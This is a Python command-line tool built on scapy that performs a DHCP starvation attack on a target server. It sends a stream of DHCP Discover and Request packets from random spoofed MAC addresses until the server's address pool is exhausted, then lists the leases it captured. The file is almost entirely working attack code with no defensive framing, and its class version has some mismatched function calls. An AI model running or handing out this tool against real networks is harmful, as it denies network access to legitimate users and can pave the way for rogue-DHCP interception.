#!/usr/bin/python3
import argparse
import re
import sys
from random import randint
from socket import gethostbyname, gethostname
from getmac import get_mac_address as gma
from colorama import Fore
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp, srp1, sniff
from scapy.utils import mac2str
from scapy.config import conf
from scapy.packet import Packet
from scapy.plist import PacketList
from scapy.interfaces import get_working_ifaces, NetworkInterface
from scapy.volatile import RandMAC

"""
    * sending a packet to 255.255.255.255 is sending to all hosts in the network, same for ff:ff:ff:ff:ff:ff except it's
    * for MAC addresses. Port 67 is the port used for the DHCP server and 68 is the port used for the client
"""
NET = {'broadcast_ip': '255.255.255.255', 'broadcast_mac': 'ff:ff:ff:ff:ff:ff', 'server_port': 67, 'client_port': 68, 'timeout': 4}


class DhcpStarvation:
    """ 
        * Summary: Perform a DHCP Starvation Attack on the given DHCP Server
        * Params: 
        *          interface - interface to perform the attck
        *          dhcp_server_ip - IP of the DHCP Server to attack

    """
    def __init__(self, interface, dhcp_servrer_ip) -> None:
        conf.iface = interface
        conf.verb = 0
        self.dhcp_server_ip = dhcp_servrer_ip
        self.dhcp_server_mac = ''

        if not self.is_server_alive():
            sys.exit(1)

    def is_server_alive(self) -> bool:
        local_ip = (r'^127\.(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.'
                r'(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])$')

        if gethostbyname(gethostname()) == self.dhcp_server_ip or re.match(local_ip, gethostbyname(gethostname())) is not None:
            print(f'Server is up and running at local host: {self.dhcp_server_ip}')
            self.dhcp_server_mac = gma()
            return True
        
        who_has_request = Ether(dst=NET.get('broadcast_mac')) / ARP(pdst=self.dhcp_server_ip)
        server_mac = srp1(who_has_request, timeout=NET.get('timeout'))

        try:
            if server_mac.hwsrc:
                server_mac = server_mac.hwsrc
                icmp_packet = Ether(dst=server_mac) / IP(dst=self.dhcp_server_ip) / ICMP(type=8)
                counter = 0

                while True:
                    # Send the packet and wait for a response
                    reply = srp1(icmp_packet, timeout=NET.get('timeout'))

                    if reply:
                        print(Fore.YELLOW + f'Server is up and running at {self.dhcp_server_ip}, with MAC: {server_mac}' + Fore.RESET)
                        self.dhcp_server_mac = server_mac
                        return True
                    else:
                        counter += 1

                    if counter == 5:
                        print(Fore.RED + 'Server is down' + Fore.RESET)
                        return False

        except AttributeError:
            print(Fore.RED + 'Server is down' + Fore.RESET)
            return False

    def dhcp_discover(self, spoofed_mac):
        """
            * Summary: send a DHCP Discover packet to all hosts on the network
            * Params:  Random MAC address to spoof the attacker machine
            * Returns: None
        """

        ether = Ether(src=mac2str(spoofed_mac), dst=NET.get('broadcast_mac'), type=0x0800)
        ip = IP(src='0.0.0.0', dst=NET.get('broadcast_ip'))
        udp = UDP(sport=NET.get('client_port'), dport=NET.get('server_port'))
        bootp = BOOTP(chaddr=mac2str(spoofed_mac), xid=randint(1, 1000000000), flags=0xFFFFFF)
        dhcp = DHCP(options=[("message-type", "discover"), "end"])
        discover_packet: Packet = ether / ip / udp / bootp / dhcp

        sendp(discover_packet)

        servers: PacketList = sniff(count=5, filter='udp and port 67 or 68', timeout=NET.get('timeout'),
                                    stop_filter=lambda packet: packet.haslayer(IP) and packet[IP].src == self.dhcp_server_ip)

        dhcp_server_info = {}

        if servers:
            for server in servers:
                if server.haslayer(IP) and server[IP].src == self.dhcp_server_ip:
                    for values in server[DHCP].options:
                        try:
                            key, val = values
                            dhcp_server_info[key] = val
                        except ValueError:
                            pass
                    if server.haslayer(BOOTP) and server[DHCP].options[0][1] == 2:
                        dhcp_server_info['offered_ip'] = server[BOOTP].yiaddr

            return discover_packet, dhcp_server_info

        else:
            print(Fore.YELLOW + f"There Is No Active DHCP Server or The Server Cannot Assign Any More IPs" + Fore.RESET)

    def dhcp_request(self, spoofed_mac: str, requested_ip: str) -> None:
            """
                * Summary: send a DHCP request packet with the requested IP and a fake MAC address to all hosts on the network
                * Params:  
                *          spoofed_mac - Random MAC address to spoof the attacker
                *          requested_ip - The offered IP from the "Offer" packet
                * Returns: None
            """
            ether = Ether(src=mac2str(spoofed_mac), dst=NET.get('broadcast_mac'))
            ip = IP(src="0.0.0.0", dst=NET.get('broadcast_ip'))
            udp = UDP(sport=NET.get('client_port'), dport=NET.get('server_port'))
            bootp = BOOTP(chaddr=mac2str(spoofed_mac), xid=randint(1, 1000000000))
            dhcp = DHCP(options=[("message-type", "request"), ("server_id", self.dhcp_server_ip), ("requested_addr", requested_ip), "end"])
            request_packet = ether / ip / udp / bootp / dhcp

            sendp(request_packet)

    def attack(self) -> dict:
        hosts = {}
        print(Fore.YELLOW + 'Starting attack, Enter Ctrl C to Stop...' + Fore.RESET)

        while True:
            try:
                spoofed_mac = RandMAC()
                _, dhcp_server_info = dhcp_discover(spoofed_mac=spoofed_mac)

                offered_ip = dhcp_server_info.get('offered_ip', None)
                if offered_ip is None:
                    print(Fore.GREEN + 'The Attack is Complete! DHCP Server cannot offer any more IP!' + Fore.RESET)
                    break

                dhcp_request(spoofed_mac, offered_ip)
                hosts[mac2str(str(spoofed_mac))] = offered_ip

            except TypeError:
                print(Fore.GREEN + 'The Attack is Complete! DHCP Server cannot offer any more IP!' + Fore.RESET)
                break

            except KeyboardInterrupt:
                break

        return hosts


def server_is_alive(server_ip: str) -> None:
    local_ip = (r'^127\.(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.'
                r'(?:[0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])$')

    if gethostbyname(gethostname()) == server_ip or re.match(local_ip, gethostbyname(gethostname())) is not None:
        print(f'Server is up')
        return

    arp_who_has_request = Ether(dst=NET.get('broadcast_mac')) / ARP(pdst=server_ip)
    server_mac = srp1(arp_who_has_request, timeout=NET.get('timeout'), verbose=0)

    try:
        if server_mac.hwsrc:
            server_mac = server_mac.hwsrc
            icmp_packet = Ether(dst=server_mac) / IP(dst=server_ip) / ICMP(type=8)
            counter = 0
            while True:
                # Send the packet and wait for a response
                reply = srp1(icmp_packet, timeout=NET.get('timeout'), verbose=0)

                if reply:
                    print(Fore.YELLOW + f'Server is up and running at {server_ip}, with the MAC: {server_mac}'
                          + Fore.RESET)
                    break
                else:
                    counter += 1

                if counter == 5:
                    print(Fore.RED + 'Server is down' + Fore.RESET)
                    sys.exit(1)

    except AttributeError:
        print(Fore.RED + 'Server is down' + Fore.RESET)
        sys.exit(1)


def dhcp_discover(dhcp_server_ip, spoofed_mac, interface):
    """
        send a DHCP Discover packet to all hosts on the network
        Arguments:
            dhcp_server_ip: IP of DHCP Server
            spoofed_mac: fake MAC address
            interface: interface to send packets
        Returns:
            None
    """

    ether = Ether(src=mac2str(spoofed_mac), dst=NET.get('broadcast_mac'), type=0x0800)
    ip = IP(src='0.0.0.0', dst=NET.get('broadcast_ip'))
    udp = UDP(sport=NET.get('client_port'), dport=NET.get('server_port'))
    bootp = BOOTP(chaddr=mac2str(spoofed_mac), xid=randint(1, 1000000000), flags=0xFFFFFF)
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    discover_packet: Packet = ether / ip / udp / bootp / dhcp

    sendp(discover_packet, iface=interface, verbose=0)

    servers: PacketList = sniff(count=5, filter='udp and port 67 or 68', timeout=NET.get('timeout'),
                                stop_filter=lambda packet: packet.haslayer(IP) and packet[IP].src == dhcp_server_ip)

    dhcp_server_info = {}

    if servers:
        for server in servers:
            if server.haslayer(IP) and server[IP].src == dhcp_server_ip:
                for values in server[DHCP].options:
                    try:
                        key, val = values
                        dhcp_server_info[key] = val
                    except ValueError:
                        pass
                if server.haslayer(BOOTP) and server[DHCP].options[0][1] == 2:
                    dhcp_server_info['offered_ip'] = server[BOOTP].yiaddr

        return discover_packet, dhcp_server_info

    else:
        print(Fore.YELLOW + f"There Is No Active DHCP Server or The Server Cannot Assign Any More IPs" + Fore.RESET)


def dhcp_request(req_ip, spoofed_mac, server_ip, interface):
    """
    send a DHCP request packet with the requested IP and a fake MAC address to all hosts on the network
    Arguments:
        req_ip: The requested IP to assign to the new host
        spoofed_mac: fake MAC address
        server_ip: IP of the DHCP server
        interface: interface to send packets
    Returns:
        None
    """
    ether = Ether(src=mac2str(spoofed_mac), dst=NET.get('broadcast_mac'))
    ip = IP(src="0.0.0.0", dst=NET.get('broadcast_ip'))
    udp = UDP(sport=NET.get('client_port'), dport=NET.get('server_port'))
    bootp = BOOTP(chaddr=mac2str(spoofed_mac), xid=randint(1, 1000000000))
    dhcp = DHCP(options=[("message-type", "request"), ("server_id", server_ip), ("requested_addr", req_ip), "end"])
    request_packet = ether / ip / udp / bootp / dhcp

    sendp(request_packet, iface=interface, verbose=0)


def dhcp_attack(dhcp_server_ip, interface):
    server_is_alive(dhcp_server_ip)
    hosts = {}
    print(Fore.YELLOW + 'Starting attack, Enter Ctrl C to Stop...' + Fore.RESET)

    while True:
        try:
            spoofed_mac = RandMAC()
            _, dhcp_server_info = dhcp_discover(dhcp_server_ip=dhcp_server_ip,
                                                spoofed_mac=spoofed_mac, interface=interface)
            offered_ip = dhcp_server_info.get('offered_ip', None)
            if offered_ip is None:
                print(Fore.GREEN + 'The Attack is Complete! DHCP Server cannot offer any more IP!' + Fore.RESET)
                break

            server_ip = dhcp_server_info.get('server_id')
            dhcp_request(offered_ip, spoofed_mac, server_ip, interface)
            hosts[mac2str(str(spoofed_mac))] = offered_ip

        except TypeError:
            print(Fore.GREEN + 'The Attack is Complete! DHCP Server cannot offer any more IP!' + Fore.RESET)
            break

        except KeyboardInterrupt:
            break

    return hosts


def main():
    interfaces: list[NetworkInterface] = get_working_ifaces()
    if not len(interfaces):
        print(Fore.RED + 'Please connect to the internet' + Fore.RESET)
        sys.exit(1)

    connected_interfaces = []
    for interface in interfaces:
        if interface.ip != '127.0.0.1':
            connected_interfaces.append(interface)

    arguments = argparse.ArgumentParser()
    arguments.add_argument('-i', '--iface', default=connected_interfaces[0], choices=interfaces, help=f'Interface to use. Default is {connected_interfaces[0]}')
    arguments.add_argument('-t', '--target', help='IP of DHCP server to attack')
    arguments = arguments.parse_args()

    try:
        if arguments.target is not None:
            try:
                offered_ip_list = dhcp_attack(dhcp_server_ip=arguments.target, interface=arguments.iface)
                print(Fore.BLUE + f'Assigned Hosts: ')
                for mac, ip_addr in offered_ip_list.values():
                    print(mac.decode(), ip_addr)

                print(Fore.RESET)

            except ValueError:
                pass

    except PermissionError:
        print('Run Program As Root!')


if __name__ == '__main__':
    main()
